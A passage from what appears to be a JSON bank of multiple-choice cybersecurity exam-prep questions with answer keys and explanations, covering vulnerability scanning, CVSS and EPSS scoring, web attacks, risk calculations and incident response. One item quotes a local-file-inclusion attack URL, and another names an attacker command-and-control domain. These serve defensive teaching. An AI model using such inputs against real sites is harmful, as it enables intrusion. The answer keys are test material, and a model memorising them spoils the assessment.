vulnerability scanning schedules?","o":["Regulatory requirements","Technical constraints","Business constraints","Staff availability"],"a":3,"e":"Scan schedules are most often determined by the organization’s risk appetite, regulatory requirements, technical constraints, business constraints, and licensing limitations. Most scans are automated and do not require staff availability.","l":"c6-requirements","l2":"","k":"scan schedule criteria"},{"id":"sg6-14","set":"sg","ch":6,"d":2,"q":"Barry placed all of his organization’s credit card processing systems on an isolated network dedicated to card processing. He has implemented appropriate segmentation controls to limit the scope of PCI DSS to those systems through the use of VLANs and firewalls. When Barry goes to conduct vulnerability scans for PCI DSS compliance purposes, what systems must he scan?","o":["Customer systems","Systems on the isolated network","Systems on the general enterprise network","Both B and C"],"a":1,"e":"If Barry is able to limit the scope of his PCI DSS compliance efforts to the isolated network, then that is the only network that must be scanned for PCI DSS compliance purposes.","l":"c6-requirements","l2":"c2-netarch","k":"PCI DSS network segmentation"},{"id":"sg6-15","set":"sg","ch":6,"d":2,"q":"Ryan is planning to conduct a vulnerability scan of a business-critical system using dangerous plug-ins. What would be the best approach for the initial scan?","o":["Run the scan against production systems to achieve the most realistic results possible.","Run the scan during business hours.","Run the scan in a test environment.","Do not run the scan to avoid disrupting the business."],"a":2,"e":"Ryan should first run his scan against a test environment to identify likely vulnerabilities and assess whether the scan itself might disrupt business activities.","l":"c6-remediation","l2":"c6-config","k":"vulnerability scan risk mitigation"},{"id":"sg6-16","set":"sg","ch":6,"d":2,"q":"Which one of the following activities is not part of the vulnerability management life cycle?","o":["Detection","Remediation","Reporting","Testing"],"a":2,"e":"Although reporting and communication are an important part of vulnerability management, they are not included in the life cycle. The three life-cycle phases are detection, remediation, and testing.","l":"c6-remediation","l2":"c6-requirements","k":"vulnerability management lifecycle"},{"id":"sg6-17","set":"sg","ch":6,"d":2,"q":"What approach to vulnerability scanning incorporates information from agents running on the target servers?","o":["Continuous monitoring","Ongoing scanning","On-demand scanning","Alerting"],"a":0,"e":"Continuous monitoring incorporates data from agent-based approaches to vulnerability detection and reports security-related configuration changes to the vulnerability management platform as soon as they occur, providing the ability to analyze those changes for potential vulnerabilities.","l":"c6-config","l2":"c6-requirements","k":"continuous monitoring agent scanning"},{"id":"sg6-18","set":"sg","ch":6,"d":2,"q":"Kolin would like to use an automated web application vulnerability scanner to identify any potential security issues in an application that is about to be deployed in his environment. Which one of the following tools is least likely to meet his needs?","o":["ZAP","Nikto","Trivy","Burp Suite"],"a":2,"e":"ZAP and Burp Suite are designed specifically for automated web application scanning, making them strong fits for Kolin’s need. Nikto can help by identifying web server misconfigurations and outdated components, so while narrower, it still provides relevant application-level insights. Trivy focuses on container and dependency scanning rather than probing live web applications for vulnerabilities, so it would least likely meet the need for a web application vulnerability scanner.","l":"c6-tools","l2":"","k":"web application scanner selection"},{"id":"sg6-19","set":"sg","ch":6,"d":2,"q":"Jessica is reading reports from vulnerability scans run by different part of her organization using different products. She is responsible for assigning remediation resources and is having difficulty prioritizing issues from different sources. What SCAP component can help Jessica with this task?","o":["CVSS","CVE","CPE","XCCDF"],"a":0,"e":"The Common Vulnerability Scoring System (CVSS) provides a standardized approach for measuring and describing the severity of security vulnerabilities. Jessica could use this scoring system to prioritize issues raised by different source systems.","l":"c6-remediation","l2":"c7-cvss","k":"CVSS remediation prioritization"},{"id":"sg6-20","set":"sg","ch":6,"d":2,"q":"Sarah would like to run an external vulnerability scan on a system for PCI DSS compliance purposes. Who is authorized to complete one of these scans?","o":["Any employee of the organization","An approved scanning vendor","A PCI DSS service provider","Any qualified individual"],"a":1,"e":"While any qualified individual may conduct internal compliance scans, PCI DSS requires the use of a scanning vendor approved by the PCI SSC for external compliance scans.","l":"c6-requirements","l2":"","k":"PCI DSS ASV scanning"},{"id":"sg7-1","set":"sg","ch":7,"d":2,"q":"Tom is reviewing a vulnerability scan report and finds that one of the servers on his network suffers from an internal IP address disclosure vulnerability. What technology is likely in use on this network that resulted in this vulnerability?","o":["TLS","NAT","SSH","VPN"],"a":1,"e":"Although the network can support any of these protocols, internal IP disclosure vulnerabilities occur when a network uses Network Address Translation (NAT) to map public and private IP addresses but a server inadvertently discloses its private IP address to remote systems.","l":"c7-server-network","l2":"c1-network","k":"internal IP disclosure vulnerability"},{"id":"sg7-2","set":"sg","ch":7,"d":2,"q":"Which one of the CVSS metrics would contain information about the type of account access that an attacker must have to execute an attack?","o":["AV","C","PR","AC"],"a":2,"e":"The privileges required (PR) metric identifies what level of account access an attacker must possess before successfully exploiting a vulnerability, such as none, low, or high privileges. The attack vector (AV) metric instead measures how the attack is delivered, like over a network or locally. The confidentiality (C) metric assesses how much sensitive data exposure results from an exploit, not what’s needed to perform it. The attack complexity (AC) metric reflects the difficulty of carrying out the attack, such as whether it requires specific conditions, rather than the level of access needed.","l":"c7-cvss","l2":"","k":"CVSS privileges required metric"},{"id":"sg7-3","set":"sg","ch":7,"d":2,"q":"Which one of the following values for the CVSS attack complexity metric would indicate that the specified attack is simplest to exploit?","o":["High","Medium","Low","Severe"],"a":2,"e":"A Low value for the attack complexity metric means the attack is easiest to exploit because it requires few or no special conditions and has a high likelihood of success once attempted. A High value indicates the exploit depends on specific circumstances or conditions, making it harder to execute. Medium and Severe are not valid CVSS options for attack complexity and therefore do not represent any defined level of exploit difficulty in the scoring system.","l":"c7-cvss","l2":"","k":"CVSS attack complexity metric"},{"id":"sg7-4","set":"sg","ch":7,"d":2,"q":"Which one of the following values for the confidentiality, integrity, or availability CVSS metric would indicate the potential for total compromise of a system?","o":["N","L","M","H"],"a":3,"e":"A High value for the confidentiality, integrity, or availability metric indicates a total or near-total compromise of the affected system, meaning an attacker could fully disclose data, alter critical information, or disrupt system operations completely. A None value means there is no impact on that element, while a Low value indicates only partial or limited impact. Medium is not a valid option for these CVSS impact metrics and therefore does not represent any recognized level of compromise.","l":"c7-cvss","l2":"","k":"CVSS impact metrics"},{"id":"sg7-5","set":"sg","ch":7,"d":2,"q":"What is the most recent version of CVSS that is currently available?","o":["3.0","3.1","4.0","3.2"],"a":2,"e":"Although it is not widely used, CVSS 4.0 has been available since 2023. Despite this, CVSS 3.1 remains the standard for most security tools today. CVSS 3.1 replaced CVSS 3.0, and CVSS 3.2 does not exist.","l":"c7-cvss","l2":"","k":"CVSS version 4.0"},{"id":"sg7-6","set":"sg","ch":7,"d":2,"q":"Which one of the following metrics is not included in the calculation of the CVSS 3.1 exploitability score?","o":["Attack vector","Vulnerability age","Attack complexity","Privileges required"],"a":1,"e":"The CVSS exploitability score is computed using the attack vector (AV), attack complexity (AC), privileges required (PR), and user interaction (UI) metrics. Vulnerability age is not an included metric.","l":"c7-cvss","l2":"","k":"CVSS exploitability metrics"},{"id":"sg7-7","set":"sg","ch":7,"d":2,"q":"Kevin recently identified a new software vulnerability and computed its CVSS base score as 6.5. Which risk category would this vulnerability fall into?","o":["Low","Medium","High","Critical"],"a":1,"e":"Vulnerabilities with CVSS base scores between 4.0 and 6.9 fit into the medium-risk category.","l":"c7-cvss","l2":"","k":"CVSS severity rating scale"},{"id":"sg7-8","set":"sg","ch":7,"d":2,"q":"Tara recently analyzed the results of a vulnerability scan report and found that a vulnerability reported by the scanner did not exist because the system was actually patched as specified. What type of error occurred?","o":["False positive","False negative","True positive","True negative"],"a":0,"e":"A false positive occurred because the scanner incorrectly reported a vulnerability that did not actually exist since the system was already patched. A false negative would mean the scanner failed to detect a real vulnerability. A true positive would indicate the scanner correctly identified an existing issue, and a true negative would mean it correctly confirmed no vulnerability was present.","l":"c7-validate","l2":"","k":"vulnerability scan false positive"},{"id":"sg7-9","set":"sg","ch":7,"d":2,"q":"Which one of the following is not a common source of information that may be correlated with vulnerability scan results?","o":["Logs","Database tables","SIEM","Configuration management system"],"a":1,"e":"It is unlikely that a database table would contain information relevant to assessing a vulnerability scan report. Logs, SIEM reports, and configuration management systems are much more likely to contain relevant information.","l":"c7-validate","l2":"c2-logging","k":"scan report correlation sources"},{"id":"sg7-10","set":"sg","ch":7,"d":2,"q":"Shahla is evaluating a vulnerability that has an EPSS score of 0.5. Which one of the following statements is correct?","o":["There is a 50% likelihood that this vulnerability will be exploited in the next 30 days.","There is a 5% likelihood that this vulnerability will be exploited in the next 30 days.","There is a 50% likelihood that attackers have already exploited this vulnerability.","There is a 5% likelihood that attackers have already exploited this vulnerability."],"a":0,"e":"An EPSS score of 0.5 means there is a 50% likelihood that the vulnerability will be exploited in the next 30 days, because the Exploit Prediction Scoring System estimates the probability of exploitation within that timeframe. The idea of a 5% likelihood confuses the meaning of the score, as 0.5 directly represents 50%. Statements suggesting attackers have already exploited the vulnerability misunderstand EPSS, which predicts future exploitation rather than confirming past events.","l":"c7-validate","l2":"","k":"EPSS score interpretation"},{"id":"sg7-11","set":"sg","ch":7,"d":2,"q":"In what type of attack does the attacker place more information in a memory location than is allocated for that use?","o":["SQL injection","LDAP injection","Cross-site scripting","Buffer overflow"],"a":3,"e":"Buffer overflow attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program’s use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. SQL injection manipulates database queries to access or modify data. LDAP injection tampers with directory service queries. Cross-site scripting injects malicious scripts into web pages to run in users’ browsers rather than overflowing memory.","l":"c7-server-network","l2":"","k":"buffer overflow vulnerability"},{"id":"sg7-12","set":"sg","ch":7,"d":2,"q":"A cybersecurity analyst is reviewing the results of a vulnerability scan that flagged more than 500 findings. The analyst’s organization has limited resources and must address the most serious threats first. The analyst wants to prioritize remediation efforts by considering the likelihood of exploitation and the value of affected assets.\n<p>Which of the following approaches BEST supports effective and repeatable prioritization of remediation efforts?</p>","o":["Sort the vulnerabilities by CVSS score and address all critical-rated findings first, regardless of asset type or context.","Prioritize vulnerabilities with a high EPSS score on publicly accessible high-value systems and validate findings to eliminate false positives.","Remediate vulnerabilities based on age, starting with those disclosed the longest time ago.","Patch only those vulnerabilities that affect Internet-facing systems, regardless of exploitability or asset value."],"a":1,"e":"Focusing on vulnerabilities with a high Exploit Prediction Scoring System (EPSS) score on publicly accessible high-value systems allows the analyst to address the most likely and most damaging threats first while validating findings ensures resources aren’t wasted on false positives. Sorting solely by CVSS score ignores real-world exploit likelihood and asset importance. Prioritizing by vulnerability age assumes older issues are more dangerous, which often isn’t true since exploitability changes over time. Limiting patching to Internet-facing systems overlooks critical internal systems that could be exploited through lateral movement or insider threats.","l":"c7-validate","l2":"c6-remediation","k":"EPSS remediation prioritization"},{"id":"sg7-13","set":"sg","ch":7,"d":2,"q":"Which one of the following protocols should never be used on a public network?","o":["SSH","HTTPS","SFTP","Telnet"],"a":3,"e":"Telnet is an insecure protocol that does not make use of encryption. The other protocols mentioned are all considered secure.","l":"c7-server-network","l2":"c2-crypto","k":"unencrypted protocol risks"},{"id":"sg7-14","set":"sg","ch":7,"d":2,"q":"Betty is selecting a transport encryption protocol for use in a new public website she is creating. Which protocol would be the best choice?","o":["SSL 2.0","SSL 3.0","TLS 1.0","TLS 1.3"],"a":3,"e":"TLS 1.3 is a secure transport protocol that supports web traffic. The other protocols listed all have flaws that render them insecure and unsuitable for use.","l":"c7-server-network","l2":"c2-crypto","k":"TLS protocol version selection"},{"id":"sg7-15","set":"sg","ch":7,"d":2,"q":"Which one of the following conditions would not result in a certificate warning during a vulnerability scan of a web server?","o":["Use of an untrusted CA","Inclusion of a public encryption key","Expiration of the certificate","Mismatch in certificate name"],"a":1,"e":"Digital certificates are intended to provide public encryption keys, and this would not cause an error. The other circumstances are all causes for concern and would trigger an alert during a vulnerability scan.","l":"c7-server-network","l2":"c2-crypto","k":"digital certificate validation errors"},{"id":"sg7-16","set":"sg","ch":7,"d":2,"q":"What type of attack depends on the fact that users are often logged into many websites simultaneously in the same browser?","o":["SQL injection","Cross-site scripting","Cross-site request forgery","File inclusion"],"a":2,"e":"Cross-site request forgery (XSRF or CSRF) attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. SQL injection targets databases by manipulating queries, cross-site scripting injects malicious scripts into web pages to run in a user’s browser, and file inclusion attacks exploit improper handling of file paths to execute or expose unauthorized files on a server.","l":"c7-web-ot","l2":"","k":"cross-site request forgery"},{"id":"sg7-17","set":"sg","ch":7,"d":2,"q":"Bonnie discovers in a web server log that the testers attempted to access using the following URL:\n<p><a href=\"http://www.mycompany.com/sortusers.php?file=C:%5Cuploads%5Cattack.exe\" rel=\"noopener\" target=\"_blank\"><code>www.mycompany.com/sortusers.php?file=C:\\uploads\\attack.exe</code></a></p>\n<p>What type of attack did they most likely attempt?</p>","o":["Reflected XSS","Persistent XSS","Local file inclusion","Remote file inclusion"],"a":2,"e":"This URL contains the address of a local file passed to a web application as an argument. It is most likely a local file inclusion (LFI) exploit, attempting to execute a malicious file that the testers previously uploaded to the server. A remote file inclusion attack would reference a file hosted on another system through a URL. Reflected and persistent cross-site scripting attacks instead inject malicious scripts into web pages to run in users’ browsers rather than loading files from the server’s filesystem.","l":"c7-web-ot","l2":"","k":"local file inclusion vulnerability"},{"id":"sg7-18","set":"sg","ch":7,"d":2,"q":"Connor is evaluating the likelihood that a new vulnerability will be exploited, and he determines that it has an EPSS score of 0.6. How should he interpret this score?","o":["There is a 6% chance that the vulnerability will be exploited in the next year.","There is a 60% chance that the vulnerability will be exploited in the next year.","There is 6% chance that the vulnerability will be exploited in the next 30 days.","There is 60% chance that the vulnerability will be exploited in the next 30 days."],"a":3,"e":"An EPSS score of 0.6 means there is a 60% probability that the vulnerability will be exploited in the next 30 days, since the Exploit Prediction Scoring System specifically measures short-term exploit likelihood based on current threat intelligence and observed attacker activity. It does not assess annual risk, so the options referring to a one-year timeframe are incorrect, and a 6% figure misrepresents the actual probability expressed by a 0.6 score, which equates to 60%, not 6%.","l":"c7-validate","l2":"","k":"EPSS exploitation probability"},{"id":"sg7-19","set":"sg","ch":7,"d":2,"q":"Monica discovers that an attacker posted a message on a web forum that she manages that is attacking users who visit the site. Which one of the following attack types is most likely to have occurred?","o":["SQL injection","Malware injection","LDAP injection","Cross-site scripting"],"a":3,"e":"In a cross-site scripting (XSS) attack, an attacker embeds scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site. The idea is to trick a user visiting a trusted site into executing malicious code placed there by an untrusted third party. SQL injection and LDAP injection both target backend databases or directory services rather than other users, and malware injection typically involves directly placing malicious software on a system instead of embedding code in a web application to attack site visitors.","l":"c7-web-ot","l2":"","k":"stored cross-site scripting"},{"id":"sg7-20","set":"sg","ch":7,"d":2,"q":"Alan is reviewing web server logs after an attack and finds many records that contain semicolons and apostrophes in queries from end users. What type of attack should he suspect?","o":["SQL injection","LDAP injection","Cross-site scripting","Buffer overflow"],"a":0,"e":"In a SQL injection attack, the attacker seeks to use a web application to gain access to an underlying database. Semicolons and apostrophes are characteristic of these attacks. LDAP injection involves similar tampering but targets directory service queries rather than SQL databases. Cross-site scripting focuses on injecting malicious scripts into web content for execution in users’ browsers, while a buffer overflow involves overloading memory space rather than inserting special characters into queries.","l":"c7-web-ot","l2":"","k":"SQL injection indicators"},{"id":"sg8-1","set":"sg","ch":8,"d":2,"q":"Jen identified and installed a missing patch on a Windows server that might allow an attacker to gain remote control of the system. After consulting with her manager, she is now running another vulnerability scan. From a risk management perspective, what is she doing at this time?","o":["Removing the threat","Reducing the threat","Validating the remediation","Reducing the vulnerability"],"a":2,"e":"Jen is validating the remediation because after applying the patch, running another vulnerability scan is meant to confirm that the vulnerability is no longer present and that the fix was effective. Removing the threat would refer to eliminating an active attacker or exploit in progress, which is not what is described here. Reducing the threat would involve changing the probability or impact associated with a threat actor’s capability or intent, not checking whether a fix worked. Reducing the vulnerability would describe the act of applying the patch itself to lessen the system’s exposure, which occurred before the follow up scan and is not the step currently being performed.","l":"c8-controls","l2":"c6-remediation","k":"validating vulnerability remediation"},{"id":"sg8-2","set":"sg","ch":8,"d":2,"q":"You notice a high number of SQL injection attacks against a web application run by your organization, and you install a web application firewall (WAF) to block many of these attacks before they reach the server. How have you altered the severity of this risk?","o":["Reduced the impact","Eliminated the vulnerability","Reduced the likelihood","Eliminated the threat"],"a":2,"e":"Installing a web application firewall (WAF) reduces the likelihood that an attack will reach the web server. Vulnerabilities may still exist in the web application and the threat of an external attack is unchanged. The impact of a successful SQL injection attack is also unchanged by a web application firewall (WAF).","l":"c8-analyzing","l2":"c8-managing","k":"risk likelihood reduction"},{"id":"sg8-3","set":"sg","ch":8,"d":2,"q":"What is the asset value (AV)?","o":["$5,000","$100,000","$500,000","$600,000"],"a":2,"e":"The asset at risk in this case is the customer database. Losing control of the database would result in a $500,000 loss, so the asset value (AV) is $500,000.","l":"c8-analyzing","l2":"","k":"asset value determination"},{"id":"sg8-4","set":"sg","ch":8,"d":2,"q":"What is the exposure factor (EF)?","o":["5%","20%","50%","100%"],"a":3,"e":"The attack would result in the total loss of customer data stored in the database, making the exposure factor (EF) 100%.","l":"c8-analyzing","l2":"","k":"exposure factor calculation"},{"id":"sg8-5","set":"sg","ch":8,"d":2,"q":"What is the single loss expectancy (SLE)?","o":["$5,000","$100,000","$500,000","$600,000"],"a":2,"e":"We compute the single loss expectancy (SLE) by multiplying the asset value (AV) ($500,000) and the exposure factor (EF) (100%) to get an SLE of $500,000.","l":"c8-analyzing","l2":"","k":"single loss expectancy calculation"},{"id":"sg8-6","set":"sg","ch":8,"d":2,"q":"What is the annualized rate of occurrence (ARO)?","o":["0.05","0.20","2.00","5.00"],"a":0,"e":"Aziz’s threat intelligence research determined that the threat has a 5% likelihood of occurrence each year. This is an ARO of 0.05.","l":"c8-analyzing","l2":"","k":"annualized rate of occurrence"},{"id":"sg8-7","set":"sg","ch":8,"d":2,"q":"What is the annualized loss expectancy (ALE)?","o":["$5,000","$25,000","$100,000","$500,000"],"a":1,"e":"We compute the annualized loss expectancy (ALE) by multiplying the SLE ($500,000) and the ARO (0.05) to get an ALE of $25,000.","l":"c8-analyzing","l2":"","k":"annualized loss expectancy calculation"},{"id":"sg8-8","set":"sg","ch":8,"d":2,"q":"Grace’s first idea is to add a web application firewall (WAF) to protect her organization against SQL injection attacks. What risk management strategy does this approach adopt?","o":["Risk acceptance","Risk avoidance","Risk mitigation","Risk transference"],"a":2,"e":"Installing new controls or upgrading existing controls is an effort to reduce the likelihood or impact of a risk. This is an example of a risk mitigation activity.","l":"c8-managing","l2":"c8-controls","k":"risk mitigation strategy"},{"id":"sg8-9","set":"sg","ch":8,"d":2,"q":"Business leaders are considering dropping the customer activities that collect and store sensitive personal information. What risk management strategy would this approach use?","o":["Risk acceptance","Risk avoidance","Risk mitigation","Risk transference"],"a":1,"e":"Changing business processes or activities to eliminate a risk is an example of risk avoidance.","l":"c8-managing","l2":"","k":"risk avoidance strategy"},{"id":"sg8-10","set":"sg","ch":8,"d":2,"q":"The business decided to install the web application firewall (WAF) and continue doing business. They still were worried about other risks to the information that were not addressed by the firewall and consider purchasing an insurance policy to cover those risks. What strategy does this use?","o":["Risk acceptance","Risk avoidance","Risk mitigation","Risk transference"],"a":3,"e":"Insurance policies use a risk transference strategy by shifting some or all of the financial risk from the organization to an insurance company.","l":"c8-managing","l2":"","k":"risk transference strategy"},{"id":"sg8-11","set":"sg","ch":8,"d":2,"q":"In the end, risk managers found that the insurance policy was too expensive and opted not to purchase it. They are taking no additional action. What risk management strategy is being used in this situation?","o":["Risk acceptance","Risk avoidance","Risk mitigation","Risk transference"],"a":0,"e":"When an organization decides to take no further action to address remaining risk, they are choosing a strategy of risk acceptance.","l":"c8-managing","l2":"","k":"risk acceptance strategy"},{"id":"sg8-12","set":"sg","ch":8,"d":2,"q":"An organization suffered a successful ransomware attack that encrypts several critical file servers. After containing the attack, the IT team wipes the affected systems, reinstalls the operating systems, and restores all data from clean backups so that normal operations can resume.\n<p>What control function is primarily being performed when the team restores from backup and rebuilds the servers?</p>","o":["Preventative","Detective","Responsive","Corrective"],"a":3,"e":"Restoring from backup and rebuilding wiped servers is a classic example of a corrective control, because it focuses on returning systems and data to a known good state after an incident has already occurred. Preventative controls are designed to stop ransomware from succeeding in the first place, such as patching, access controls, or application allow listing. Detective controls are aimed at identifying or alerting on malicious activity, like IDS alerts, log monitoring, or file integrity checks. Responsive controls involve immediate reaction or containment to limit damage, such as isolating affected hosts from the network or disabling compromised accounts. In this scenario, those containment actions have already happened, and the activity described is specifically about repair and restoration of normal operations, which is the role of corrective controls.","l":"c8-controls","l2":"c11-recover","k":"corrective control function"},{"id":"sg8-13","set":"sg","ch":8,"d":2,"q":"Which of the following is often used to assist with the prevention of XSS and SQL injection attacks?","o":["Secure session management","Input validation","SLOs","Maintenance windows"],"a":1,"e":"Input validation helps prevent a wide range of problems, from cross-site scripting (XSS) to SQL injection attacks. Secure session management ensures that attackers cannot hijack user sessions or that session issues don’t cause confusion among users. Organizations that offer technology services to customers may define service-level objectives (SLOs) that set formal expectations for service availability, data preservation, and other key requirements. Many organizations choose to consolidate many changes in a single period of time known as a maintenance window. Maintenance windows typically occur on evenings and weekends or during other periods of time where business activity is low.","l":"c8-sdlc","l2":"c7-web-ot","k":"input validation defense"},{"id":"sg8-14","set":"sg","ch":8,"d":2,"q":"After a security incident, a company’s CISO directs the security team to implement quarterly user access reviews for all critical applications and to require annual security awareness training for all employees. From the perspective of control types, how should these new measures be classified?","o":["Technical controls","Compensating controls","Administrative controls","Physical controls"],"a":2,"e":"Quarterly user access reviews and annual security awareness training are administrative controls because they are policy and procedure-driven measures that govern how people and processes should operate to manage security risk. Technical controls rely on technology and system configurations, such as firewalls, encryption, or endpoint protection, rather than procedural reviews or training programs. Compensating controls are alternative safeguards put in place to meet a security requirement when the primary or recommended control cannot be implemented, which is not the case here since these measures are part of the standard control framework. Physical controls focus on protecting the tangible environment, such as locks, guards, and surveillance cameras, and do not address user access governance or staff education.","l":"c8-controls","l2":"","k":"administrative security controls"},{"id":"sg8-15","set":"sg","ch":8,"d":2,"q":"A security architect is concerned that developers are unknowingly pulling vulnerable third-party and open source libraries into a new microservices-based application. The architect wants an automated process that scans source repositories and container images to discover all third-party components and compares them against vulnerability databases on an ongoing basis.\n<p>Which security approach best meets this requirement?</p>","o":["Static application security testing (SAST)","Software composition analysis (SCA)","Dynamic application security testing (DAST)","Manual code review"],"a":1,"e":"Software composition analysis best fits this scenario because it is specifically designed to inventory third-party and open source components in code bases and container images and continuously compare them against known vulnerability databases, which directly addresses the concern about vulnerable libraries being pulled into a microservices application. Static application security testing focuses on analyzing proprietary source code for security flaws such as injection or logic errors, not on identifying and tracking third-party components. Dynamic application security testing evaluates running applications from the outside by sending requests and analyzing responses, which can reveal runtime issues but does not provide a comprehensive bill of materials for libraries and their known CVEs. Manual code review depends on human reviewers and is time-consuming and error-prone for identifying all third-party components across many microservices, and it lacks the continuous, automated vulnerability correlation that the architect is seeking.","l":"c8-appsec","l2":"","k":"software composition analysis"},{"id":"sg8-16","set":"sg","ch":8,"d":2,"q":"A development director complains that static and dynamic testing tools keep finding the same types of security issues release after release, even though the team “fixes” the specific vulnerabilities each time. He asks the security architect how SAMM could help solve this problem.\n<p>Which explanation best aligns with the role of SAMM as described in the chapter?</p>","o":["SAMM replaces SAST and DAST so that code-level issues will no longer occur.","SAMM focuses on the maturity of governance, design, implementation, verification, and operations practices.","SAMM is used to generate SBOMs and track third-party components across applications.","SAMM is a tool that automatically patches all vulnerabilities discovered by scanners."],"a":1,"e":"Security Assurance Maturity Model addresses the root causes of recurring vulnerabilities by improving the maturity of an organization’s governance, design, implementation, verification, and operations practices so that secure practices are built into the development life cycle rather than repeatedly fixing individual defects. It does not replace static or dynamic testing tools, which are still needed to find code-level issues but instead helps structure and improve how those activities are planned, integrated, and acted upon. It is not used to generate software bills of materials or track third-party components, which is the role of software composition analysis tools. It is also not an automated patching tool and cannot directly fix vulnerabilities discovered by scanners; its purpose is to guide process and practice improvements so that such vulnerabilities become less frequent over time.","l":"c8-appsec","l2":"","k":"SAMM maturity model"},{"id":"sg8-17","set":"sg","ch":8,"d":2,"q":"STRIDE is an example of what?","o":["Zero-day rating systems","Vulnerability assessment tools","Adversary analysis tools","Threat modeling methodology"],"a":3,"e":"STRIDE is a threat modeling methodology because it is a structured framework used to categorize and analyze potential threats to a system based on spoofing, tampering, repudiation, information disclosure, denial of service, and elevation of privilege. It is not a zero-day rating system, as it does not assign scores or ratings to previously unknown vulnerabilities. It is not a vulnerability assessment tool, since it does not scan systems or directly detect vulnerabilities but rather guides thinking about possible threats. It is also not an adversary analysis tool, because it focuses on types of threats and their impact on system components rather than profiling specific attackers or their capabilities.","l":"c8-managing","l2":"c4-classify","k":"STRIDE threat modeling"},{"id":"sg8-18","set":"sg","ch":8,"d":2,"q":"What type of software testing tool executes the code as it is being tested?","o":["Static application security testing (SAST)","Dynamic application security testing (DAST)","Compilation","Decompilation"],"a":1,"e":"Dynamic application security testing (DAST) techniques actually execute the code during the testing process. Static application security testing (SAST) tools and techniques analyze the structure and content of code without executing the code itself. Compilation is the process of transforming source code into an executable and decompilation attempts to reverse that process. Neither compilation nor decompilation executes the code.","l":"c8-appsec","l2":"","k":"dynamic application security testing"},{"id":"sg8-19","set":"sg","ch":8,"d":2,"q":"Adam is conducting software testing by reviewing the source code of the application. What type of code testing is Adam conducting?","o":["Mutation testing","Static code analysis","Dynamic code analysis","Fuzzing"],"a":1,"e":"Adam is conducting static code analysis by reviewing the source code. Dynamic code analysis requires running the program, and both mutation testing and fuzzing are types of dynamic analysis.","l":"c8-appsec","l2":"","k":"static code analysis"},{"id":"sg8-20","set":"sg","ch":8,"d":2,"q":"During testing, Tiffany slowly increases the number of connections to an application until it fails. What is she doing?","o":["Regression testing","Unit testing","Stress testing","Fagan testing"],"a":2,"e":"Tiffany is stress-testing the application. Stress testing intentionally goes beyond the application’s normal limits to see how it responds to extreme loads or other abnormal conditions beyond its normal capacity. Unit testing tests individual components of an applications, while regression testing is done to ensure that new versions don’t introduce old bugs. Fagan testing is a formal method of code inspection.","l":"c8-appsec","l2":"","k":"application stress testing"},{"id":"sg9-1","set":"sg","ch":9,"d":3,"q":"Which one of the following is an example of a cybersecurity incident?","o":["User accesses a secure file","Administrator changes a file’s permission settings","Intruder breaks into a building","Former employee crashes a server"],"a":3,"e":"A former employee crashing a server is an example of a cybersecurity incident because it constitutes a direct violation of the system’s availability. A user accessing a secure file and an administrator changing file permission settings are examples of security events but are not cybersecurity incidents.\n<p>An intruder breaking into a building may be a security event, but it is not necessarily a cybersecurity event unless they perform some action affecting a computer system.</p>","l":"c9-process","l2":"","k":"cybersecurity incident definition"},{"id":"sg9-2","set":"sg","ch":9,"d":3,"q":"During what phase of the incident response process would an organization implement defenses designed to reduce the likelihood of a cybersecurity incident?","o":["Preparation","Detection and analysis","Containment, eradication, and recovery","Post-incident activity"],"a":0,"e":"Organizations should build solid, layered approaches to cybersecurity during the preparation phase of the incident response process. The controls built during this phase serve to reduce the likelihood and impact of future incidents.","l":"c9-process","l2":"","k":"incident response preparation phase"},{"id":"sg9-3","set":"sg","ch":9,"d":3,"q":"Alan is responsible for developing his organization’s detection and analysis capabilities. He would like to purchase a system that can combine log records from multiple sources to detect potential cybersecurity incidents. What type of system is best suited to meet Alan’s security objective?","o":["IPS","IDS","SIEM","Firewall"],"a":2,"e":"A security information and event management (SIEM) system correlates log entries from multiple sources and attempts to identify potential cybersecurity incidents.","l":"c9-process","l2":"c3-tools","k":"SIEM event correlation"},{"id":"sg9-4","set":"sg","ch":9,"d":3,"q":"During a severe thunderstorm, a power failure causes several servers in an organization’s datacenter to shut down unexpectedly. The organization’s customer portal becomes unavailable for 45 minutes. The CSIRT reviews logs and monitoring data and finds no signs of malicious activity or policy violations. How should the team classify this occurrence?","o":["Security breach","Event","Cybersecurity incident","Adverse event"],"a":3,"e":"A power failure that disrupts services is an event with a negative consequence, so it is an adverse event. It is not a cybersecurity incident because there is no evidence that the confidentiality, integrity, or availability of information or systems was jeopardized without lawful authority, and there is no indication of a policy or acceptable use violation.","l":"c9-process","l2":"","k":"adverse event definition"},{"id":"sg9-5","set":"sg","ch":9,"d":3,"q":"What phase of the incident response process would include measures designed to limit the damage caused by an ongoing breach?","o":["Preparation","Detection and analysis","Containment, eradication, and recovery","Post-incident activity"],"a":2,"e":"The containment protocols contained in the containment, eradication, and recovery phase are designed to limit the damage caused by an ongoing cybersecurity incident.","l":"c9-process","l2":"c11-contain","k":"containment phase objectives"},{"id":"sg9-6","set":"sg","ch":9,"d":3,"q":"During an intrusion investigation, the CSIRT identifies that the compromised host repeatedly connected to an attacker-controlled domain <code>evil.net</code> to receive commands. In the Diamond Model, what vertex does <code>evil.net</code> represent?","o":["Adversary","Capability","Infrastructure","Victim"],"a":2,"e":"<code>Evil.net</code> is a domain used by the attacker as part of the command-and-control channel, so it fits the Infrastructure vertex because it is an external resource the attacker relies on to deliver, host, or route malicious activity. The Adversary vertex describes the human or organization conducting the attack rather than the domain they use. Capability refers to the tools, techniques, or malware that enable the attack, rather than the network location. The Victim describes the targeted entity or compromised host, rather than the attacker-controlled domain.","l":"c9-frameworks","l2":"","k":"Diamond Model infrastructure vertex"},{"id":"sg9-7","set":"sg","ch":9,"d":3,"q":"A SOC receives an IDS alert for suspicious outbound connections from a workstation, and the help desk also reports the same user is seeing repeated credential prompts. The on-call analyst is not yet sure whether the activity is benign or malicious. What is the most appropriate next step in the incident response process?","o":["Begin eradication by reimaging the workstation","Conduct validation by reviewing logs and alerts","Schedule a lessons-learned meeting","Restore the user’s system from backup"],"a":1,"e":"Reviewing logs and alerts is the appropriate next step because the situation is still unconfirmed and needs validation to determine whether the indicators reflect a true incident, what the scope is, and what actions are justified. Reimaging immediately is an eradication action that is premature without confirming malicious activity and could destroy useful evidence. A lessons-learned meeting belongs after containment, eradication, and recovery have occurred, and restoring from backup is part of recovery and also assumes you have already established that a compromise occurred and that restoration is 